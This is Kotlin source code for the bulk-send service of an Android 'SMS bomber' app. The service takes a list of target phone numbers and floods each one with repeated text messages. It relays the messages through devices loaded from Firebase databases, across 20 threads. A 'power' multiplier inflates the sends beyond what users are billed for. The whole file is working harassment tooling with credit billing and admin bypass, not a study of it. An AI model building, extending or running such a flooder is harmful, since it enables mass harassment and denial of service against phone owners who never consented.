package com.sanji.bomberpro.services

import com.google.firebase.firestore.FirebaseFirestore
import com.sanji.bomberpro.FirebaseConfig
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.tasks.await
import kotlinx.coroutines.withContext
import kotlin.math.ceil

data class BulkBlastConfig(
    val perNumberCount: Int,
    val power: Int,
    val speed: BlastSpeed,
)

data class BulkCostEstimate(
    val numbersCount: Int,
    val perNumberCount: Int,
    val power: Int,
    /** Total SMS attempts (numbers × perNumber × power) — what devices will try to send */
    val totalSmsAttempts: Int,
    /** Base units billed (numbers × perNumber) — what user actually pays for */
    val totalBaseSms: Int,
    val creditCostPerSms: Int,
    /** Credits user will be charged at most (base × cost) */
    val totalCredits: Int,
    val affordable: Boolean,
    /** How many base units user can afford with current credits */
    val maxAffordableBase: Int,
    /** How many numbers user can afford at current perNumber setting */
    val maxAffordableNumbers: Int,
)

class BulkBlastService {

    private val db = FirebaseFirestore.getInstance()
    private val userData = UserDataService()
    private val rtdb = RealtimeDbService()

    suspend fun isUserPremium(uid: String): Boolean = withContext(Dispatchers.IO) {
        try {
            val snap = db.collection(FirebaseConfig.COL_USERS).document(uid).get().await()
            snap.getBoolean("premium") ?: false
        } catch (_: Exception) {
            false
        }
    }

    fun cleanNumbers(raw: List<String>): List<String> {
        return raw.map { it.trim() }
            .map { it.replace(" ", "").replace("-", "") }
            .filter { it.length >= 7 }
            .filter { it.all { ch -> ch.isDigit() || ch == '+' } }
            .distinct()
    }

    /**
     * Cost estimate.
     *
     * BILLING MODEL:
     *  - User pays numbers × perNumberCount × creditCostPerSms (BASE only — power free).
     *  - Power inflates actual sends: numbers × perNumberCount × power.
     *  - bulkCreditCostPerNumber acts as a floor per number (prevents cheap spam).
     *
     * totalCredits = max(
     *   baseSms × creditCostPerSms,
     *   numbers × bulkCreditCostPerNumber
     * )
     *
     * Admin: totalCredits = 0, always affordable.
     */
    suspend fun estimate(
        numbersCount: Int,
        perNumberCount: Int,
        power: Int,
        uid: String,
        isAdmin: Boolean,
    ): BulkCostEstimate = withContext(Dispatchers.IO) {
        val settings = userData.getGlobalSettings()
        val costPerSms = settings.creditCostPerSms.coerceAtLeast(1)
        val costPerNumber = settings.bulkCreditCostPerNumber.coerceAtLeast(1)

        val safePower = power.coerceAtLeast(1)
        val totalSmsAttempts = numbersCount * perNumberCount * safePower
        val baseSms = numbersCount * perNumberCount

        val bySms = baseSms * costPerSms
        val byNumber = numbersCount * costPerNumber
        val totalCredits = maxOf(bySms, byNumber)

        if (isAdmin) {
            return@withContext BulkCostEstimate(
                numbersCount = numbersCount,
                perNumberCount = perNumberCount,
                power = safePower,
                totalSmsAttempts = totalSmsAttempts,
                totalBaseSms = baseSms,
                creditCostPerSms = costPerSms,
                totalCredits = 0,
                affordable = true,
                maxAffordableBase = Int.MAX_VALUE,
                maxAffordableNumbers = Int.MAX_VALUE,
            )
        }

        val available = userData.getCredits(uid)
        val affordable = available >= totalCredits

        // How many base SMS user can afford
        val maxBySms = if (costPerSms > 0) available / costPerSms else 0
        val maxByNumber = if (costPerNumber > 0) available / costPerNumber else 0

        // perNumber is fixed — so we compute how many numbers we can afford
        val maxNumbersFromSms = if (perNumberCount > 0) maxBySms / perNumberCount else 0
        val maxNumbersFromFloor = maxByNumber
        val maxAffordableNumbers = minOf(maxNumbersFromSms, maxNumbersFromFloor).coerceAtLeast(0)

        BulkCostEstimate(
            numbersCount = numbersCount,
            perNumberCount = perNumberCount,
            power = safePower,
            totalSmsAttempts = totalSmsAttempts,
            totalBaseSms = baseSms,
            creditCostPerSms = costPerSms,
            totalCredits = totalCredits,
            affordable = affordable,
            maxAffordableBase = maxBySms,
            maxAffordableNumbers = maxAffordableNumbers,
        )
    }

    /**
     * Execute bulk blast.
     * Each number gets its own `BlastExecutor.execute()` call.
     * Credits reserved/refunded per-number — user never overcharged.
     */
    suspend fun executeBulk(
        uid: String,
        isAdmin: Boolean,
        userName: String,
        userEmail: String,
        numbers: List<String>,
        message: String,
        config: BulkBlastConfig,
        onProgress: (index: Int, total: Int, sent: Int, failed: Int) -> Unit,
        cancelFlag: java.util.concurrent.atomic.AtomicBoolean,
    ): BulkBlastSummary = withContext(Dispatchers.IO) {
        val executor = BlastExecutor(rtdb)
        val settings = userData.getGlobalSettings()
        val costPerSms = settings.creditCostPerSms.coerceAtLeast(1)

        var totalSent = 0
        var totalFailed = 0
        var totalCharged = 0
        var totalRefunded = 0
        val startTs = System.currentTimeMillis()

        try {
            val firebases = rtdb.loadFirebases()
            val devices = rtdb.scanAll(firebases)

            if (devices.isEmpty()) {
                return@withContext BulkBlastSummary(
                    numbersAttempted = 0,
                    numbersCompleted = 0,
                    totalSent = 0,
                    totalFailed = 0,
                    totalCharged = 0,
                    totalRefunded = 0,
                    durationSec = 0,
                    cancelled = false,
                    error = "No devices online",
                )
            }

            numbers.forEachIndexed { i, target ->
                if (cancelFlag.get()) return@forEachIndexed
                try {
                    var perNumberSent = 0
                    var perNumberFailed = 0
                    var perNumberCharged = 0
                    var perNumberRefunded = 0

                    executor.execute(
                        uid = uid,
                        isAdmin = isAdmin,
                        userData = userData,
                        userName = userName,
                        userEmail = userEmail,
                        devices = devices,
                        target = target,
                        message = message,
                        count = config.perNumberCount,
                        power = config.power,
                        threads = 20,
                        speed = config.speed,
                        cancelFlag = cancelFlag,
                        creditCostPerSms = costPerSms,
                    ).collect { event ->
                        when (event) {
                            is BlastEvent.Progress -> {
                                perNumberSent = event.sent
                                perNumberFailed = event.failed
                            }
                            is BlastEvent.Complete -> {
                                perNumberSent = event.sent
                                perNumberFailed = event.failed
                                perNumberCharged = event.chargedCredits
                                perNumberRefunded = event.refundedCredits
                            }
                            else -> Unit
                        }
                        onProgress(
                            i,
                            numbers.size,
                            totalSent + perNumberSent,
                            totalFailed + perNumberFailed,
                        )
                    }

                    totalSent += perNumberSent
                    totalFailed += perNumberFailed
                    totalCharged += perNumberCharged
                    totalRefunded += perNumberRefunded
                } catch (_: Exception) {
                    totalFailed += config.perNumberCount * config.power
                }
            }

            try {
                userData.saveBulkBlastHistory(
                    uid = uid,
                    numbers = numbers,
                    message = message,
                    perNumberCount = config.perNumberCount,
                    power = config.power,
                    totalSent = totalSent,
                    totalFailed = totalFailed,
                    durationSec = (System.currentTimeMillis() - startTs) / 1000L,
                    speed = config.speed.label,
                    status = if (cancelFlag.get()) "stopped" else "completed",
                )
            } catch (_: Exception) {}

            BulkBlastSummary(
                numbersAttempted = numbers.size,
                numbersCompleted = numbers.size,
                totalSent = totalSent,
                totalFailed = totalFailed,
                totalCharged = totalCharged,
                totalRefunded = totalRefunded,
                durationSec = (System.currentTimeMillis() - startTs) / 1000L,
                cancelled = cancelFlag.get(),
                error = null,
            )
        } catch (e: Exception) {
            BulkBlastSummary(
                numbersAttempted = numbers.size,
                numbersCompleted = 0,
                totalSent = totalSent,
                totalFailed = totalFailed,
                totalCharged = totalCharged,
                totalRefunded = totalRefunded,
                durationSec = (System.currentTimeMillis() - startTs) / 1000L,
                cancelled = cancelFlag.get(),
                error = e.message ?: "Bulk failed",
            )
        }
    }
}

data class BulkBlastSummary(
    val numbersAttempted: Int,
    val numbersCompleted: Int,
    val totalSent: Int,
    val totalFailed: Int,
    val totalCharged: Int,
    val totalRefunded: Int,
    val durationSec: Long,
    val cancelled: Boolean,
    val error: String?,
)